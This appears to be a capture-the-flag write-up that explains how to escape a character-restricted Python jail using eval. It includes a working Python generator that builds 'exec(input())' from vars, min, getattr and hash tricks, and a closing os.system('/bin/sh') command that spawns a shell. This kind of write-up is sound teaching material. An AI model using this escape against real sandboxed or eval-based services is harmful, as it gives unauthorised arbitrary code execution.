Trying some valid inputs results in prompts like:  
```  
>>> str  
You try double eval'ing your contraption: <class 'str'>  
Your contraption did not work.  
```  
This lets us know that the challenge is doing `eval(eval(input))`. So if we
can craft some `input` that gives us shell, we can break out. If we can find a
valid input that results in the string `"exec(input)" `, then we will have
`eval(eval("exec(input)"))`, from which we can execute arbitrary python code
without the character limitation. However, the character limitation means that
there are very few things we can do to get `"exec(input())"`.

We can:  
1) call functions, since we have access to ()  
2) call built ins that are in the valid character set: `int(), getattr(),
enumerate(), hasattr(), setattr(), ascii(), iter(), min(), set(), sum(),
chr(), vars(), range(), str(), isinstance(), hash()`  
3) create tuples

Notably we can't use e.g. `lambda` or `for`. We also dont have `'` or `"` so
we can't convert any of the letters we have into strings like `"get"`

Trying various combinations of the builtins, we find that we can get numbers
from `int` and `hash`:  
```  
>>> int()  
>>> 0  
>>> hash(str)  
>>> 532164  
```

Python `hash` is not a cryptographic hash. Rather it returns the Python
internal hash value. This effectively (for this chall) is large random
numbers.

We also have `chr` which allows us to convert from unicode codepoint number
e.g. `40` to the character `A`. This suggests a potential approach: we can get
new letters that we didn't previously have access to by getting the unicode
number, and then using `chr`. `hash` called on random objects, e.g. `str`,
`()`, `(str, int)` gives us an endless supply of large numbers. We also have
access to `//` so we can floor divide to get smaller numbers. This hit-or-miss
approach gets quite close, but would require an intensive brute force to try
and find hashes that can be floor divided to get exactly what we want. If only
we had access to some arithmetic ...

Okay, so assuming we are able to get the numbers we need, we now have a new
issue: we cannot construct the final string. if we had the right numbers we
may be able to construct e.g.  
```  
>>> (chr(101), chr(120), chr(101), (chr(99))  
('e', 'x', 'e', 'c')  
```

But this is not equal to `"exec"` which is what we need.

This is the trickiest part of the chall: solving both these problems comes
from a useful coincidence, that is quite hard to discover.

A builtin we have is `vars`. `vars` will return the `__dict__` attribute for
the object we apply it to, which includes all of its callables.  
```  
>>> set(vars(str))  
{'__le__', '__contains__', 'casefold', 'center', 'count', 'find', 'rfind',
'rstrip', 'istitle', 'isprintable', '__ge__', '__rmod__', 'rjust', '__mod__',
'__eq__', 'startswith', '__sizeof__', '__mul__', 'ljust', 'rpartition',
'__getattribute__', 'format', 'isnumeric', 'swapcase', '__getnewargs__',
'zfill', '__doc__', 'isalnum', '__add__', 'rindex', 'isdecimal', '__len__',
'isalpha', 'replace', 'partition', 'expandtabs', 'isspace', 'title',
'__new__', 'islower', 'isdigit', 'join', 'strip', '__format__', 'lstrip',
'upper', 'isupper', 'lower', '__getitem__', '__gt__', 'format_map',
'__repr__', 'rsplit', 'split', 'index', 'endswith', '__hash__', 'maketrans',
'isidentifier', 'splitlines', '__str__', '__ne__', '__lt__', 'translate',
'__rmul__', '__iter__', 'capitalize', 'encode'}  
>>> set(vars(int))  
{'__le__', '__pos__', '__ror__', '__sub__', '__ge__', '__rmod__',
'__rfloordiv__', '__mod__', '__neg__', '__eq__', '__xor__', '__ceil__',
'__rdivmod__', '__sizeof__', '__rsub__', '__rshift__', '__mul__', 'real',
'imag', '__getattribute__', '__pow__', '__getnewargs__', '__divmod__',
'__int__', '__float__', '__index__', '__doc__', 'conjugate', '__rxor__',
'__floor__', '__radd__', '__add__', '__rrshift__', 'denominator', '__or__',
'__truediv__', '__new__', '__trunc__', '__format__', '__rpow__', '__rand__',
'__bool__', '__invert__', '__round__', '__lshift__', '__rlshift__', '__gt__',
'__and__', '__rtruediv__', '__repr__', 'to_bytes', '__hash__', 'from_bytes',
'numerator', '__str__', '__ne__', '__lt__', '__rmul__', '__abs__',
'__floordiv__', 'bit_length'}  
```

If we had any of these strings, we could use `getattr(object, attribute)` to
call a method on an object. This might help with getting arithmetic on math,
since Python `int` has `__add__`, `__sub__`. But how do we get elements out of
the dictionary (returned by `vars`) or the set (returned by `set(vars)`)? We
can `iter` over them, but without `next` (no `x` available), we can't access
the elements still. There is only one useful built-in: `min`. `min` returns
the smallest object in set, or smallest key in dict, based on
_lexicographical_ ordering. Luckily, the smallest thing by lexicographical
ordering is exactly what we want!

```  
>>>min(vars(str)  
>>>'__add__'  
```

Now if we had `a` and `b` we can do `getattr('a', min(vars(str)))('b')` which
returns `ab`. We can also do `getattr(1, min(vars(str)))(2)` which returns
`3`.

The exploit program is below.

First, provide function `n(x)` to represent arbitrary numbers using the
addition trick above and `hash`. Some "magic" numbers must be found from
`hash` that are close to the desired codepoints, otherwise we have recursion
depth exceeded on the chall server.  
```  
one = "hash(())//hash(())"

def add(x, y):  
   return "getattr({},min(vars(str)))({})".format(x, y)

def n(x):  
   if x == 80:  
       return "hash((str,str))//hash(str)//hash(((),))"  
   if x == 39:  
       return "hash((str,()))//hash(((),()))"  
   elif x == 6:  
       return "hash(())//hash(str)"  
   elif x == 1:  
       return one  
   elif x > 80:  
       return add(n(80), n(x - 80))  
   elif x > 39:  
       return add(n(39), n(x - 39))  
   elif x > 6:  
       return add(n(6), n(x - 6))  
   else:  
       return add(one, n(x-1))  
```

Then we get the unicode representation of the shellcode we want, and convert
from unicode into chars, and join again with addition trick from above.  
```  
def char(x):  
   return "chr({})".format(n(ord(x)))

def shell():  
   des = "exec(input())"  
   return (char(x) for x in des)

def joined_shell():  
   init = "str()"  
   for x in shell():  
       init = add(init, x)  
   return init

print(joined_shell())  
```

Running this on the chall server provides `input()` that we can type anything
into. E.g. `import os; os.system("/bin/sh")`. Since this is `input()`, we are
not bound by the restrictions of the jail. This is then run by `exec`, and we
have shell access, the chall flag is in the root dir.